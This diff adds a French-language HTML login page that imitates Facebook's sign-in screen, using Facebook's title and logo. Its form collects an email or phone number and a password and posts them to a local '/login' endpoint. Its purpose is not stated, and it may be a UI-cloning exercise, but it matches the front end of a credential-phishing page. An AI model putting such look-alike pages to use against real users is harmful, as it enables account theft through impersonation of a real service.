@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connectez-vous ou inscrivez-vous</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px 28px;
+            width: 100%;
+            max-width: 396px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 180px;
+            height: auto;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        button[type="submit"] {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            margin-top: 16px;
+            font-size: 14px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .create-account {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #dadde1;
+        }
+        .create-account button {
+            background-color: #42b72a;
+            color: white;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .create-account button:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="/images/logos/facebook-logo.png" alt="Facebook">
+        </div>
+        <form action="/login" method="POST">
+            <input type="text" name="email_or_phone" placeholder="Adresse e-mail ou numéro de tél." required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+        <div class="create-account">
+            <button type="button">Créer nouveau compte</button>
+        </div>
+    </div>
+</body>
+</html>
